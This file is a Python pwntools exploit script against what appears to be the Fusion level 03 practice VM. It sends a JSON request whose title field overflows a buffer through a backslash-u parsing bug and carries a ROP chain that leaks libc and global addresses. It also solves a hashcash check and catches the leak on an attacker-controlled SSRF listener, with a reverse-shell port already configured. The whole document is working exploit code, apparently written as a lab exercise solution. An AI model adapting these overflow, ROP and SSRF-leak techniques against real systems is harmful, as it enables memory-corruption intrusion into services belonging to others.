import random, string, hmac
import hashlib
import json
import struct
import time
import pwn
import sys
from enum import Enum


rhost = 'fusion'
rport = 20003
ssrf_callback_port = 8000
reverse_shell_callback_port = 8001
lhost = '192.168.6.1'

class LeakableValue(Enum):
    LIBC_START_MAIN = '__libc_start_main'
    GTITLE = 'gTitle'
    ASPRINTF_CHK = '__asprintf_chk'

class LeakMethod(Enum):
    GTITLE = 'gTitle'
    GCONTENT = 'gContent'

def random_string(size=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=size))

def generate_payload(tag: str, leaked_value: str, leak_method: str) -> bytes:
    # Bad characters: NULL byte (0x00) and backwards slash (0x5c)
    title_expected_length = 128
    distance_from_overflow_to_return_pointer = 35

    memcpy_plt = 0x08048e60
    post_blog_article = 0x08049f20 
    gTitle = 0x0804be04
    gContents = 0x0804bdf4
    libc_start_main_plt = 0x08048d80 
    libc_start_main_got_address_location = libc_start_main_plt + 0x2 # The address we write gets dereferenced twice and the value written to the output. So this address gets dereferenced to the address of __libc_start_main@got and that gets dereferenced to yield the address of __libc_start_main.


    # Not needed if you know the libc version
    # If you don't know the libc version, then this second address will help you find it out
    # https://libc.blukat.me/?q=__libc_start_main%3A020%2C__asprintf_chk%3A0xb751f260&l=libc6_2.13-20ubuntu5_i386
    asprintf_chk_plt = 0x08048de0
    asprintf_chk_got_address_location = asprintf_chk_plt + 0x2 

    gTitle_reference = 0x08049f44

    if leaked_value == LeakableValue.LIBC_START_MAIN:
        leaked_value_pointer_to_pointer = libc_start_main_got_address_location
    elif leaked_value == LeakableValue.GTITLE:
        leaked_value_pointer_to_pointer = gTitle_reference
    else: 
        leaked_value_pointer_to_pointer = asprintf_chk_got_address_location

    if leak_method == LeakMethod.GTITLE:
        write_location = gTitle
    else:
        write_location = gContents

    rop_chain: bytes = b''
    rop_chain += pwn.p32(memcpy_plt) # Go to memcpy
    rop_chain += pwn.p32(post_blog_article) # return to this function
    rop_chain += pwn.p32(write_location) # Where to write to
    rop_chain += pwn.p32(leaked_value_pointer_to_pointer) # From where to write
    rop_chain += b'\x04' # How many bytes to write. BTW) need to get lucky here and hope that the area is zeroed out (or that it doesn't matter how many bytes we write). I can't write b'0x00000004' because NULL bytes are bad characters.

    malicious_title: bytes = b'A' * (title_expected_length - 1)
    malicious_title += b'\\\u' # \u symbol in input will push the counter forward by 2 and the while loop will not terminate at the expected location
    malicious_title += b'B' * distance_from_overflow_to_return_pointer
    malicious_title += rop_chain

    payload: bytes = f'{{"tags": ["{tag}"], "contents": "test", "serverip": "{lhost}:{ssrf_callback_port}", "title": "'.encode()
    payload += malicious_title
    payload += b'" }'

    return payload
    

def generate_hashcashed_payload(token: str, leaked_value: str, leak_method: str) -> bytes:
    pwn.log.info('Generating hashcashed payload')
    while (True):
        request_body: bytes = generate_payload(random_string(20), leaked_value, leak_method)
        
        payload = token.encode() + b'\n' + request_body
        hashed = hmac.new(token.encode(), payload, hashlib.sha1)
     
        if hashed.hexdigest()[:4] == "0000":
            pwn.log.info("Payload:")
            print(payload)
            pwn.log.info(f"Hash: {hashed.hexdigest()}")
            return payload


def receive_token(io) -> str:
    token: str = io.recvline().decode().split('"')[1]
    pwn.log.info(f"Token: {token}")
    return token
    

def main(leaked_value: LeakableValue = LeakableValue.LIBC_START_MAIN, leak_method: LeakMethod = LeakMethod.GCONTENT):
    leakable_items = [e for e in LeakableValue]
    leak_methods = [e for e in LeakMethod]
    if leaked_value not in leakable_items:
        print(f'ERROR: leaked value must be one of {leakable_items}')
        sys.exit(1)
    if leak_method not in leak_methods:
        print(f'ERROR: leak method must be one of {leak_methods}')
        sys.exit(1)

    pwn.log.info(f'Attempting to leak {leaked_value} via {leak_method}')

    callback_listener = pwn.listen(ssrf_callback_port)
    io = pwn.remote(rhost, rport)

    token = receive_token(io)
    payload: bytes = generate_hashcashed_payload(token, leaked_value, leak_method)

    io.send(payload)
    pwn.log.info('Payload sent!')
    io.close()

    callback_listener.wait_for_connection()
    response = callback_listener.recv()
    pwn.log.info('Received the following response from server:')
    print(response)

    if leak_method == LeakMethod.GCONTENT:
        leaked_address = pwn.u32(response[-4:])
    else:
        leaked_address = pwn.u32(response.split(b'\r\n')[5][:4])

    pwn.log.info(f'Parsed out {leaked_value} from response: {hex(leaked_address)}')

    return leaked_address

if __name__ == "__main__":
    main()
